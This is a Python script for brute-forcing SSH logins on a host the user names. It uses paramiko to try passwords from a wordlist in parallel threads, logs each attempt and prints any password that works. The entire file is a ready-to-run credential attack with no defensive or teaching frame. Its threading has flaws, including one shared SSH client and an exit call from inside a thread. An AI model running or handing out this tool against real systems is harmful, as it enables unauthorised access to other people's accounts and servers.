import paramiko
import os
import sys
import threading
import time
import logging

# Input from the user for the target IP, username, and password file location
target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to brute force: '))
password_file = str(input('Please enter location of the password file: '))

# Set max number of threads to run concurrently
MAX_THREADS = 10
MAX_RETRIES = 3  # Max retry for failed attempts before skipping a password

# Set up logging
logging.basicConfig(filename="brute_force.log", level=logging.DEBUG, format='%(asctime)s - %(message)s')
logging.info("Starting brute force attack...")

def ssh_connect(password, ssh_client, code=0):
    """
    Attempts to connect to the target server using the given password via SSH.
    
    Args:
        password (str): The password to try.
        ssh_client (paramiko.SSHClient): The SSH client instance used to make the connection.
        code (int): The status code to return. Default is 0 for success.
        
    Returns:
        int: 
            - 0 if the connection was successful
            - 1 if authentication failed
            - 2 if there was an error connecting
    """
    try:
        # Attempt to connect with a timeout of 5 seconds
        ssh_client.connect(target, port=22, username=username, password=password, timeout=5)
        return 0  # Success
    except paramiko.AuthenticationException:
        return 1  # Authentication failed
    except Exception as e:
        # Catch any other exceptions (e.g., connection errors)
        logging.error(f"Error with password {password}: {e}")
        return 2  # General error

def try_password(password, ssh_client, retry_count=0):
    """
    Tries a single password on the target system and checks the result.
    
    Args:
        password (str): The password to attempt.
        ssh_client (paramiko.SSHClient): The SSH client instance used for the connection.
        retry_count (int): The number of retries for this password.
    """
    response = ssh_connect(password, ssh_client)
    
    if response == 0:
        # Password is correct, exit with success
        print(f"Password found: {password}")
        logging.info(f"Password found: {password}")
        exit(0)
    elif response == 1:
        # Authentication failed, retry if needed
        if retry_count < MAX_RETRIES:
            print(f"Retrying password (attempt {retry_count + 1}): {password}")
            logging.info(f"Retrying password (attempt {retry_count + 1}): {password}")
            time.sleep(1)  # Avoid spamming the server too quickly
            try_password(password, ssh_client, retry_count + 1)
        else:
            print(f"Incorrect password: {password}")
            logging.info(f"Incorrect password: {password}")
    elif response == 2:
        # Error occurred during connection, notify the user
        print(f"Error occurred while trying password: {password}")
        logging.error(f"Error occurred while trying password: {password}")

def read_passwords():
    """
    Reads passwords from the specified password file and returns them as a list.
    
    Returns:
        list: List of passwords read from the file.
    """
    with open(password_file, 'r') as file:
        return [line.strip() for line in file.readlines()]

def run_brute_force(passwords):
    """
    Runs the brute force attack by attempting each password in parallel using threads.
    
    Args:
        passwords (list): List of passwords to attempt.
    """
    threads = []  # List to hold threads
    ssh_client = paramiko.SSHClient()  # Create SSH client instance
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add unknown host keys
    
    total_passwords = len(passwords)
    attempted = 0

    # Try to connect using each password in a thread
    for idx, password in enumerate(passwords):
        # Wait if the maximum number of threads is reached
        if len(threads) >= MAX_THREADS:
            for thread in threads:
                thread.join()  # Wait for threads to finish before starting new ones
            threads = []  # Clear the list of threads
        
        # Create a new thread for each password attempt
        thread = threading.Thread(target=try_password, args=(password, ssh_client))
        thread.start()
        threads.append(thread)
        
        # Update progress
        attempted += 1
        print(f"Attempting password {attempted}/{total_passwords}...")
        logging.info(f"Attempting password {attempted}/{total_passwords}...")
    
    # Wait for all remaining threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Check if the password file exists
    if not os.path.exists(password_file):
        print("Password file not found!")
        logging.error("Password file not found!")
        sys.exit(1)

    # Read passwords from the file
    passwords = read_passwords()
    
    # Start the brute force attack
    run_brute_force(passwords)
